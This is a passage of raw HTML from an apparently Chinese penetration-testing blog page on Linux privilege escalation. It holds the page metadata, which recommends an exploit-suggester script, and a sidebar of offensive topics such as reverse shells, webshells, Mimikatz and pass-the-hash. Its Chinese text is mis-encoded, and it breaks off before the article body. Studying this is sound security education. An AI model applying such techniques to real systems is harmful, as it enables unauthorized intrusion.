<!DOCTYPE html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-beta.61" />
    <meta name="theme" content="VuePress Theme Hope" />
    <meta property="og:url" content="https://hzyxy.github.io/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html"><meta property="og:site_name" content="XY"><meta property="og:title" content="Linuxææƒ"><meta property="og:description" content="Linuxææƒ å»ºè®® å…ˆæ‰¾éæ¼æ´ææƒï¼Œå› ä¸ºæ¼æ´ææƒå¯èƒ½ä¼šå°†æœåŠ¡å™¨å¼„è“å±ç­‰æ•…éšœï¼Œä¼šéå¸¸éº»çƒ¦ã€‚ æ¼æ´ææƒ Linuxæ¼æ´ææƒæ£€æµ‹è„šæœ¬ è·å–å†…æ ¸ç‰ˆæœ¬åï¼Œå¯ä»¥æœç´¢è¯¥ç‰ˆæœ¬å­˜åœ¨å“ªäº›æ¼æ´å¯ä»¥ç”¨æ¥è¿›è¡Œææƒ ä¾‹å¦‚å¸¸ç”¨çš„æ£€æµ‹è„šæœ¬ï¼š linux-exploit-suggester-2ï¼šhttps://github.com/jondonas/linux-exploit-suggester-2"><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="XY"><meta property="article:tag" content="Linuxç³»ç»Ÿå†…ç½‘å®‰å…¨"><meta property="article:tag" content="ææƒ"><meta property="article:published_time" content="2023-03-10T00:00:00.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Linuxææƒ","image":[""],"datePublished":"2023-03-10T00:00:00.000Z","dateModified":null,"author":[{"@type":"Person","name":"XY","url":"https://hzyxy.github.io"}]}</script><title>Linuxææƒ | XY</title><meta name="description" content="Linuxææƒ å»ºè®® å…ˆæ‰¾éæ¼æ´ææƒï¼Œå› ä¸ºæ¼æ´ææƒå¯èƒ½ä¼šå°†æœåŠ¡å™¨å¼„è“å±ç­‰æ•…éšœï¼Œä¼šéå¸¸éº»çƒ¦ã€‚ æ¼æ´ææƒ Linuxæ¼æ´ææƒæ£€æµ‹è„šæœ¬ è·å–å†…æ ¸ç‰ˆæœ¬åï¼Œå¯ä»¥æœç´¢è¯¥ç‰ˆæœ¬å­˜åœ¨å“ªäº›æ¼æ´å¯ä»¥ç”¨æ¥è¿›è¡Œææƒ ä¾‹å¦‚å¸¸ç”¨çš„æ£€æµ‹è„šæœ¬ï¼š linux-exploit-suggester-2ï¼šhttps://github.com/jondonas/linux-exploit-suggester-2">
    <style>
      :root {
        --bg-color: #fff;
      }

      html[data-theme="dark"] {
        --bg-color: #1d1e1f;
      }

      html,
      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <link rel="preload" href="/assets/style-3d9ff12a.css" as="style"><link rel="stylesheet" href="/assets/style-3d9ff12a.css">
    <link rel="modulepreload" href="/assets/app-dd5faae6.js"><link rel="modulepreload" href="/assets/framework-b6a07282.js"><link rel="modulepreload" href="/assets/Linuxææƒ.html-66e972dc.js"><link rel="modulepreload" href="/assets/Linuxææƒ.html-1f6bf0b3.js"><link rel="prefetch" href="/assets/intro.html-85095aee.js" as="script"><link rel="prefetch" href="/assets/index.html-c517837e.js" as="script"><link rel="prefetch" href="/assets/slides.html-e30de825.js" as="script"><link rel="prefetch" href="/assets/index.html-55939d36.js" as="script"><link rel="prefetch" href="/assets/index.html-da0d688b.js" as="script"><link rel="prefetch" href="/assets/index.html-2c2b5f3c.js" as="script"><link rel="prefetch" href="/assets/index.html-938100e2.js" as="script"><link rel="prefetch" href="/assets/index.html-d1a03358.js" as="script"><link rel="prefetch" href="/assets/ä¸€å¥è¯æœ¨é©¬é›†åˆ.html-18b3a34a.js" as="script"><link rel="prefetch" href="/assets/åå¼¹Shell.html-d1786afc.js" as="script"><link rel="prefetch" href="/assets/LInuxåº”æ€¥å“åº”.html-6337519e.js" as="script"><link rel="prefetch" href="/assets/index.html-038c0d41.js" as="script"><link rel="prefetch" href="/assets/Metasploitå·¥å…·ä½¿ç”¨.html-942fa2b5.js" as="script"><link rel="prefetch" href="/assets/index.html-a88fa1fa.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ä»£ç†.html-09e81afe.js" as="script"><link rel="prefetch" href="/assets/PHPåŸºç¡€è¯­æ³•.html-88060ba8.js" as="script"><link rel="prefetch" href="/assets/index.html-1e040f9c.js" as="script"><link rel="prefetch" href="/assets/IPCæ¨ªå‘ç§»åŠ¨.html-eff7a44c.js" as="script"><link rel="prefetch" href="/assets/Kerberosç™½é“¶ç¥¨æ®.html-f5e7fa6b.js" as="script"><link rel="prefetch" href="/assets/Kerberosé»„é‡‘ç¥¨æ®.html-ea85d83b.js" as="script"><link rel="prefetch" href="/assets/Mimikatzå·¥å…·çš„ä½¿ç”¨.html-a92435df.js" as="script"><link rel="prefetch" href="/assets/PsExecå·¥å…·è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¨ªå‘ç§»åŠ¨.html-0fc96c4d.js" as="script"><link rel="prefetch" href="/assets/PTTæ”»å‡»ä¹‹MS14-068.html-a4c4ee1a.js" as="script"><link rel="prefetch" href="/assets/RDPå¯†ç è·å–.html-69031c6f.js" as="script"><link rel="prefetch" href="/assets/index.html-6e17e1c5.js" as="script"><link rel="prefetch" href="/assets/smbexecæ¨ªå‘ç§»åŠ¨.html-a3ca7a5f.js" as="script"><link rel="prefetch" href="/assets/WindowsåŸŸè®¤è¯.html-bab92ead.js" as="script"><link rel="prefetch" href="/assets/Windowsåº”æ€¥å“åº”.html-95dce042.js" as="script"><link rel="prefetch" href="/assets/Windowsææƒ.html-d1885a09.js" as="script"><link rel="prefetch" href="/assets/Windowsæƒé™ç»´æŒ.html-8b81542b.js" as="script"><link rel="prefetch" href="/assets/Windowsè¢«æŠ“å¯†ç çš„é˜²å¾¡æ‰‹æ®µ.html-8e938312.js" as="script"><link rel="prefetch" href="/assets/Windowsè®¤è¯åŸç†.html-8fbaf98e.js" as="script"><link rel="prefetch" href="/assets/WMICè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¨ªå‘ç§»åŠ¨.html-0f6cda22.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘IPä¿¡æ¯æ”¶é›†ï¼ˆå·¥å…·ï¼‰.html-dcb383ee.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ä¸»æœºåŸºæœ¬ä¿¡æ¯æ”¶é›†.html-076b4f32.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ç«¯å£ä¿¡æ¯æ”¶é›†.html-85889a23.js" as="script"><link rel="prefetch" href="/assets/å“ˆå¸Œä¼ é€’æ”»å‡»ï¼ˆPTHï¼‰.html-f7708546.js" as="script"><link rel="prefetch" href="/assets/åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†.html-e3e4be63.js" as="script"><link rel="prefetch" href="/assets/å¯†ç å–·æ´’æ”»å‡».html-27dc1386.js" as="script"><link rel="prefetch" href="/assets/å¯†é’¥ä¼ é€’æ”»å‡»ï¼ˆPTKï¼‰.html-a37a41ec.js" as="script"><link rel="prefetch" href="/assets/æŠ“å–Windowså¯†ç .html-819120ad.js" as="script"><link rel="prefetch" href="/assets/æ•æ„Ÿä¿¡æ¯æ”¶é›†.html-3fae222c.js" as="script"><link rel="prefetch" href="/assets/æµè§ˆå™¨ã€æ•°æ®åº“ç­‰å…¶ä»–å¯†ç çš„æŠ“å–.html-7e47176a.js" as="script"><link rel="prefetch" href="/assets/ç¥¨æ®ä¼ é€’æ”»å‡»ï¼ˆPTTï¼‰.html-e7dd71db.js" as="script"><link rel="prefetch" href="/assets/Python-requestsæ¨¡å—.html-6b5acd07.js" as="script"><link rel="prefetch" href="/assets/index.html-32937562.js" as="script"><link rel="prefetch" href="/assets/index.html-cfa34ac3.js" as="script"><link rel="prefetch" href="/assets/index.html-d96610ee.js" as="script"><link rel="prefetch" href="/assets/index.html-a128c3b9.js" as="script"><link rel="prefetch" href="/assets/01Meow.html-6fb11283.js" as="script"><link rel="prefetch" href="/assets/02Fawn.html-a62258a2.js" as="script"><link rel="prefetch" href="/assets/03Dancing.html-f1becab3.js" as="script"><link rel="prefetch" href="/assets/04Redeemer.html-cc7356ff.js" as="script"><link rel="prefetch" href="/assets/05Appointment.html-49e5be75.js" as="script"><link rel="prefetch" href="/assets/06Sequel.html-1036fc61.js" as="script"><link rel="prefetch" href="/assets/07Crocodile.html-cb7cf7b2.js" as="script"><link rel="prefetch" href="/assets/08Responder.html-f7e76995.js" as="script"><link rel="prefetch" href="/assets/index.html-70844bef.js" as="script"><link rel="prefetch" href="/assets/index.html-cd0b7f44.js" as="script"><link rel="prefetch" href="/assets/Webä¿¡æ¯æ”¶é›†.html-37297f4a.js" as="script"><link rel="prefetch" href="/assets/Fastjsonååºåˆ—åŒ–æ¼æ´.html-76a8a7f2.js" as="script"><link rel="prefetch" href="/assets/Log4jæ¼æ´.html-005e50ee.js" as="script"><link rel="prefetch" href="/assets/index.html-5abeedf0.js" as="script"><link rel="prefetch" href="/assets/Redisæœªæˆæƒè®¿é—®.html-7064ef7c.js" as="script"><link rel="prefetch" href="/assets/Shiroååºåˆ—åŒ–æ¼æ´.html-13ce1675.js" as="script"><link rel="prefetch" href="/assets/Spring Cloud Gateway RCEæ¼æ´.html-b0ff7ea8.js" as="script"><link rel="prefetch" href="/assets/Spring Framework RCEæ¼æ´.html-8d75b5e2.js" as="script"><link rel="prefetch" href="/assets/Struts2 RCEæ¼æ´.html-d56baeb5.js" as="script"><link rel="prefetch" href="/assets/CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ .html-d86f6a3e.js" as="script"><link rel="prefetch" href="/assets/PHPååºåˆ—åŒ–æ¼æ´.html-51d0d262.js" as="script"><link rel="prefetch" href="/assets/index.html-c72ca44e.js" as="script"><link rel="prefetch" href="/assets/SQLæ³¨å…¥.html-d5ea2027.js" as="script"><link rel="prefetch" href="/assets/SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ .html-e235d4f6.js" as="script"><link rel="prefetch" href="/assets/SSTIæ¨¡æ¿æ³¨å…¥.html-6d413bf5.js" as="script"><link rel="prefetch" href="/assets/XSSè·¨ç«™è„šæœ¬æ”»å‡».html-9115714d.js" as="script"><link rel="prefetch" href="/assets/XXEå¤–éƒ¨å®ä½“æ³¨å…¥.html-f9c10bdf.js" as="script"><link rel="prefetch" href="/assets/æ–‡ä»¶ä¸Šä¼ æ¼æ´.html-736c8008.js" as="script"><link rel="prefetch" href="/assets/æ–‡ä»¶åŒ…å«æ¼æ´.html-b1978607.js" as="script"><link rel="prefetch" href="/assets/è¿œç¨‹ä»£ç æ‰§è¡Œ.html-95a2aaf5.js" as="script"><link rel="prefetch" href="/assets/é€»è¾‘æ¼æ´.html-aa2be5ca.js" as="script"><link rel="prefetch" href="/assets/404.html-843e1bd1.js" as="script"><link rel="prefetch" href="/assets/index.html-8ecd10e6.js" as="script"><link rel="prefetch" href="/assets/index.html-b46eb32d.js" as="script"><link rel="prefetch" href="/assets/index.html-7fd5e2f0.js" as="script"><link rel="prefetch" href="/assets/index.html-95a4be4a.js" as="script"><link rel="prefetch" href="/assets/index.html-70b4861a.js" as="script"><link rel="prefetch" href="/assets/index.html-50f2a08d.js" as="script"><link rel="prefetch" href="/assets/index.html-0ad3875a.js" as="script"><link rel="prefetch" href="/assets/index.html-1da3ae35.js" as="script"><link rel="prefetch" href="/assets/index.html-6e4c31eb.js" as="script"><link rel="prefetch" href="/assets/index.html-beae3398.js" as="script"><link rel="prefetch" href="/assets/index.html-314a48b4.js" as="script"><link rel="prefetch" href="/assets/index.html-641bac96.js" as="script"><link rel="prefetch" href="/assets/index.html-afaa875e.js" as="script"><link rel="prefetch" href="/assets/index.html-6756f4e1.js" as="script"><link rel="prefetch" href="/assets/index.html-8c7ba3e6.js" as="script"><link rel="prefetch" href="/assets/index.html-2fd28e83.js" as="script"><link rel="prefetch" href="/assets/index.html-b787cca3.js" as="script"><link rel="prefetch" href="/assets/index.html-a2e579ab.js" as="script"><link rel="prefetch" href="/assets/index.html-5f2fc615.js" as="script"><link rel="prefetch" href="/assets/index.html-af135525.js" as="script"><link rel="prefetch" href="/assets/index.html-e66f144e.js" as="script"><link rel="prefetch" href="/assets/index.html-9ba30c95.js" as="script"><link rel="prefetch" href="/assets/index.html-40443127.js" as="script"><link rel="prefetch" href="/assets/index.html-4c886121.js" as="script"><link rel="prefetch" href="/assets/index.html-fa457839.js" as="script"><link rel="prefetch" href="/assets/index.html-328f77a8.js" as="script"><link rel="prefetch" href="/assets/intro.html-f7b7eb36.js" as="script"><link rel="prefetch" href="/assets/index.html-4b5152a1.js" as="script"><link rel="prefetch" href="/assets/slides.html-ed20dba7.js" as="script"><link rel="prefetch" href="/assets/index.html-25a8fc05.js" as="script"><link rel="prefetch" href="/assets/index.html-7fdf5872.js" as="script"><link rel="prefetch" href="/assets/index.html-7ba3d324.js" as="script"><link rel="prefetch" href="/assets/index.html-0de0e79b.js" as="script"><link rel="prefetch" href="/assets/index.html-dc8413fd.js" as="script"><link rel="prefetch" href="/assets/ä¸€å¥è¯æœ¨é©¬é›†åˆ.html-bfb1572f.js" as="script"><link rel="prefetch" href="/assets/åå¼¹Shell.html-797e5b14.js" as="script"><link rel="prefetch" href="/assets/LInuxåº”æ€¥å“åº”.html-aba22fdf.js" as="script"><link rel="prefetch" href="/assets/index.html-705a3912.js" as="script"><link rel="prefetch" href="/assets/Metasploitå·¥å…·ä½¿ç”¨.html-c6258075.js" as="script"><link rel="prefetch" href="/assets/index.html-04b83dca.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ä»£ç†.html-70f207a9.js" as="script"><link rel="prefetch" href="/assets/PHPåŸºç¡€è¯­æ³•.html-2b00abdd.js" as="script"><link rel="prefetch" href="/assets/index.html-27824dcd.js" as="script"><link rel="prefetch" href="/assets/IPCæ¨ªå‘ç§»åŠ¨.html-5036eef2.js" as="script"><link rel="prefetch" href="/assets/Kerberosç™½é“¶ç¥¨æ®.html-6b1b7542.js" as="script"><link rel="prefetch" href="/assets/Kerberosé»„é‡‘ç¥¨æ®.html-2bcfa1be.js" as="script"><link rel="prefetch" href="/assets/Mimikatzå·¥å…·çš„ä½¿ç”¨.html-4dabd55e.js" as="script"><link rel="prefetch" href="/assets/PsExecå·¥å…·è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¨ªå‘ç§»åŠ¨.html-cf6031b8.js" as="script"><link rel="prefetch" href="/assets/PTTæ”»å‡»ä¹‹MS14-068.html-229ab676.js" as="script"><link rel="prefetch" href="/assets/RDPå¯†ç è·å–.html-f5314187.js" as="script"><link rel="prefetch" href="/assets/index.html-291cdb7d.js" as="script"><link rel="prefetch" href="/assets/smbexecæ¨ªå‘ç§»åŠ¨.html-bd3f9d0f.js" as="script"><link rel="prefetch" href="/assets/WindowsåŸŸè®¤è¯.html-98aaffb7.js" as="script"><link rel="prefetch" href="/assets/Windowsåº”æ€¥å“åº”.html-cb7f7d9e.js" as="script"><link rel="prefetch" href="/assets/Windowsææƒ.html-fddcc760.js" as="script"><link rel="prefetch" href="/assets/Windowsæƒé™ç»´æŒ.html-b420726d.js" as="script"><link rel="prefetch" href="/assets/Windowsè¢«æŠ“å¯†ç çš„é˜²å¾¡æ‰‹æ®µ.html-a1b95692.js" as="script"><link rel="prefetch" href="/assets/Windowsè®¤è¯åŸç†.html-2b5bfa63.js" as="script"><link rel="prefetch" href="/assets/WMICè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¨ªå‘ç§»åŠ¨.html-e9900fd2.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘IPä¿¡æ¯æ”¶é›†ï¼ˆå·¥å…·ï¼‰.html-8df714c3.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ä¸»æœºåŸºæœ¬ä¿¡æ¯æ”¶é›†.html-ff647eb7.js" as="script"><link rel="prefetch" href="/assets/å†…ç½‘ç«¯å£ä¿¡æ¯æ”¶é›†.html-9904c743.js" as="script"><link rel="prefetch" href="/assets/å“ˆå¸Œä¼ é€’æ”»å‡»ï¼ˆPTHï¼‰.html-177bbb68.js" as="script"><link rel="prefetch" href="/assets/åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†.html-e9796b82.js" as="script"><link rel="prefetch" href="/assets/å¯†ç å–·æ´’æ”»å‡».html-7202336d.js" as="script"><link rel="prefetch" href="/assets/å¯†é’¥ä¼ é€’æ”»å‡»ï¼ˆPTKï¼‰.html-5481af39.js" as="script"><link rel="prefetch" href="/assets/æŠ“å–Windowså¯†ç .html-c248c027.js" as="script"><link rel="prefetch" href="/assets/æ•æ„Ÿä¿¡æ¯æ”¶é›†.html-8d79e8c8.js" as="script"><link rel="prefetch" href="/assets/æµè§ˆå™¨ã€æ•°æ®åº“ç­‰å…¶ä»–å¯†ç çš„æŠ“å–.html-019a4e5a.js" as="script"><link rel="prefetch" href="/assets/ç¥¨æ®ä¼ é€’æ”»å‡»ï¼ˆPTTï¼‰.html-acdf0e38.js" as="script"><link rel="prefetch" href="/assets/Python-requestsæ¨¡å—.html-30766057.js" as="script"><link rel="prefetch" href="/assets/index.html-03b50ebd.js" as="script"><link rel="prefetch" href="/assets/index.html-944a9b7c.js" as="script"><link rel="prefetch" href="/assets/index.html-3c91f418.js" as="script"><link rel="prefetch" href="/assets/index.html-2216da59.js" as="script"><link rel="prefetch" href="/assets/01Meow.html-144f49c2.js" as="script"><link rel="prefetch" href="/assets/02Fawn.html-8d1f6ae7.js" as="script"><link rel="prefetch" href="/assets/03Dancing.html-102195cf.js" as="script"><link rel="prefetch" href="/assets/04Redeemer.html-a8f14750.js" as="script"><link rel="prefetch" href="/assets/05Appointment.html-47ea2d01.js" as="script"><link rel="prefetch" href="/assets/06Sequel.html-09623ec6.js" as="script"><link rel="prefetch" href="/assets/07Crocodile.html-d98953a2.js" as="script"><link rel="prefetch" href="/assets/08Responder.html-bd8c11b2.js" as="script"><link rel="prefetch" href="/assets/index.html-52add0e3.js" as="script"><link rel="prefetch" href="/assets/index.html-587e9e41.js" as="script"><link rel="prefetch" href="/assets/Webä¿¡æ¯æ”¶é›†.html-10f53862.js" as="script"><link rel="prefetch" href="/assets/Fastjsonååºåˆ—åŒ–æ¼æ´.html-5eab3d81.js" as="script"><link rel="prefetch" href="/assets/Log4jæ¼æ´.html-4b853947.js" as="script"><link rel="prefetch" href="/assets/index.html-d4c7bcc7.js" as="script"><link rel="prefetch" href="/assets/Redisæœªæˆæƒè®¿é—®.html-97f79a4a.js" as="script"><link rel="prefetch" href="/assets/Shiroååºåˆ—åŒ–æ¼æ´.html-8f4ec688.js" as="script"><link rel="prefetch" href="/assets/Spring Cloud Gateway RCEæ¼æ´.html-2b0045b8.js" as="script"><link rel="prefetch" href="/assets/Spring Framework RCEæ¼æ´.html-ee4c9f39.js" as="script"><link rel="prefetch" href="/assets/Struts2 RCEæ¼æ´.html-5fa3d7d9.js" as="script"><link rel="prefetch" href="/assets/CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ .html-87e13702.js" as="script"><link rel="prefetch" href="/assets/PHPååºåˆ—åŒ–æ¼æ´.html-28157585.js" as="script"><link rel="prefetch" href="/assets/index.html-99a33745.js" as="script"><link rel="prefetch" href="/assets/SQLæ³¨å…¥.html-53392527.js" as="script"><link rel="prefetch" href="/assets/SSRFæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ .html-ef95986f.js" as="script"><link rel="prefetch" href="/assets/SSTIæ¨¡æ¿æ³¨å…¥.html-f2d5f40a.js" as="script"><link rel="prefetch" href="/assets/XSSè·¨ç«™è„šæœ¬æ”»å‡».html-8294e366.js" as="script"><link rel="prefetch" href="/assets/XXEå¤–éƒ¨å®ä½“æ³¨å…¥.html-101c7226.js" as="script"><link rel="prefetch" href="/assets/æ–‡ä»¶ä¸Šä¼ æ¼æ´.html-a84a5b23.js" as="script"><link rel="prefetch" href="/assets/æ–‡ä»¶åŒ…å«æ¼æ´.html-3194d1e6.js" as="script"><link rel="prefetch" href="/assets/è¿œç¨‹ä»£ç æ‰§è¡Œ.html-e618985b.js" as="script"><link rel="prefetch" href="/assets/é€»è¾‘æ¼æ´.html-8dbed891.js" as="script"><link rel="prefetch" href="/assets/404.html-7a9bea77.js" as="script"><link rel="prefetch" href="/assets/index.html-1a0a8b98.js" as="script"><link rel="prefetch" href="/assets/index.html-1bd72bd1.js" as="script"><link rel="prefetch" href="/assets/index.html-b7fc2931.js" as="script"><link rel="prefetch" href="/assets/index.html-39379dee.js" as="script"><link rel="prefetch" href="/assets/index.html-f287dbf8.js" as="script"><link rel="prefetch" href="/assets/index.html-4c0c108a.js" as="script"><link rel="prefetch" href="/assets/index.html-9fb86865.js" as="script"><link rel="prefetch" href="/assets/index.html-f17b6ccd.js" as="script"><link rel="prefetch" href="/assets/index.html-d1033906.js" as="script"><link rel="prefetch" href="/assets/index.html-e7218a45.js" as="script"><link rel="prefetch" href="/assets/index.html-fb9fa453.js" as="script"><link rel="prefetch" href="/assets/index.html-202a0a0d.js" as="script"><link rel="prefetch" href="/assets/index.html-fc11a95c.js" as="script"><link rel="prefetch" href="/assets/index.html-3938cc83.js" as="script"><link rel="prefetch" href="/assets/index.html-6eed2045.js" as="script"><link rel="prefetch" href="/assets/index.html-15182f4c.js" as="script"><link rel="prefetch" href="/assets/index.html-b7795669.js" as="script"><link rel="prefetch" href="/assets/index.html-9b3cf9f5.js" as="script"><link rel="prefetch" href="/assets/index.html-1c00757f.js" as="script"><link rel="prefetch" href="/assets/index.html-3554c543.js" as="script"><link rel="prefetch" href="/assets/index.html-e8fe7f5f.js" as="script"><link rel="prefetch" href="/assets/index.html-db6da400.js" as="script"><link rel="prefetch" href="/assets/index.html-3d48f19b.js" as="script"><link rel="prefetch" href="/assets/index.html-659ae5f3.js" as="script"><link rel="prefetch" href="/assets/index.html-3af6b4cb.js" as="script"><link rel="prefetch" href="/assets/index.html-2401145c.js" as="script"><link rel="prefetch" href="/assets/auto-ba5ecab5.js" as="script"><link rel="prefetch" href="/assets/index-b03bef79.js" as="script"><link rel="prefetch" href="/assets/flowchart-35969cab.js" as="script"><link rel="prefetch" href="/assets/mermaid.core-253d1f76.js" as="script"><link rel="prefetch" href="/assets/highlight.esm-a794bb63.js" as="script"><link rel="prefetch" href="/assets/markdown.esm-d92a2fc9.js" as="script"><link rel="prefetch" href="/assets/math.esm-70a288c8.js" as="script"><link rel="prefetch" href="/assets/notes.esm-224f94d9.js" as="script"><link rel="prefetch" href="/assets/reveal.esm-e5069ce0.js" as="script"><link rel="prefetch" href="/assets/search.esm-2c3fba7d.js" as="script"><link rel="prefetch" href="/assets/zoom.esm-b83b91d0.js" as="script"><link rel="prefetch" href="/assets/VuePlayground-9ef1efef.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-36cd6c3c.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="skip-link sr-only">è·³è‡³ä¸»è¦å…§å®¹</a><!--]--><div class="theme-container has-toc"><!--[--><header class="navbar" id="navbar"><div class="navbar-start"><button type="button" class="toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><a href="/" class="brand"><img class="logo" src="/logo.png" alt="XY"><!----><span class="site-name hide-in-pad">XY</span></a><!--[--><!----><!--]--></div><div class="navbar-center"><!--[--><!----><!--]--><nav class="nav-links"><div class="nav-item hide-in-mobile"><a href="/" class="nav-link" aria-label="ä¸»é¡µ"><span class="font-icon icon iconfont icon-home" style=""></span>ä¸»é¡µ<!----></a></div><div class="nav-item hide-in-mobile"><a href="/WebSec/" class="nav-link" aria-label="Webå®‰å…¨"><span class="font-icon icon iconfont icon-sidebar" style=""></span>Webå®‰å…¨<!----></a></div><div class="nav-item hide-in-mobile"><a href="/IntranetSec/" class="nav-link active" aria-label="å†…ç½‘å®‰å…¨"><span class="font-icon icon iconfont icon-computer" style=""></span>å†…ç½‘å®‰å…¨<!----></a></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="ç¼–ç¨‹è¯­è¨€"><span class="title"><span class="font-icon icon iconfont icon-code" style=""></span>ç¼–ç¨‹è¯­è¨€</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/code/python/" class="nav-link" aria-label="Python"><span class="font-icon icon iconfont icon-python" style=""></span>Python<!----></a></li><li class="dropdown-item"><a href="/code/php/" class="nav-link" aria-label="PHP"><span class="font-icon icon iconfont icon-php" style=""></span>PHP<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="ç½‘ç»œè®¾å¤‡"><span class="title"><span class="font-icon icon iconfont icon-share" style=""></span>ç½‘ç»œè®¾å¤‡</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/Network/Routing/" class="nav-link" aria-label="Routing"><span class="font-icon icon iconfont icon-router" style=""></span>Routing<!----></a></li><li class="dropdown-item"><a href="/Network/Switching/" class="nav-link" aria-label="Switching"><span class="font-icon icon iconfont icon-tree" style=""></span>Switching<!----></a></li><li class="dropdown-item"><a href="/Network/Security/" class="nav-link" aria-label="Security"><span class="font-icon icon iconfont icon-safe" style=""></span>Security<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="æ¸—é€é¶åœº"><span class="title"><span class="font-icon icon iconfont icon-activity" style=""></span>æ¸—é€é¶åœº</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/Range/HTB/" class="nav-link" aria-label="HTB"><span class="font-icon icon iconfont icon-module" style=""></span>HTB<!----></a></li></ul></button></div></div></nav><!--[--><!----><!--]--></div><div class="navbar-end"><!--[--><!----><!--]--><!----><!----><div class="nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--[--><!----><!--]--><button type="button" class="toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span class="button-container"><span class="button-top"></span><span class="button-middle"></span><span class="button-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside class="sidebar" id="sidebar"><!--[--><!----><!--]--><ul class="sidebar-links"><li><section class="sidebar-group"><button class="sidebar-heading clickable" type="button"><span class="font-icon icon iconfont icon-config" style=""></span><span class="title">å®‰å…¨å·¥å…·</span><span class="arrow end"></span></button><!----></section></li><li><section class="sidebar-group"><button class="sidebar-heading clickable active" type="button"><span class="font-icon icon iconfont icon-linux" style=""></span><span class="title">Linuxç³»ç»Ÿå†…ç½‘å®‰å…¨</span><span class="arrow down"></span></button><ul class="sidebar-links"><li><!--[--><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html" class="router-link-active router-link-exact-active nav-link active sidebar-link sidebar-page active" aria-label="Linuxææƒ"><!---->Linuxææƒ<!----></a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a aria-current="page" href="/IntranetSec/LinuxSec/Linux%E6%8F%90%E6%9D%83.html#linuxææƒ" class="router-link-active 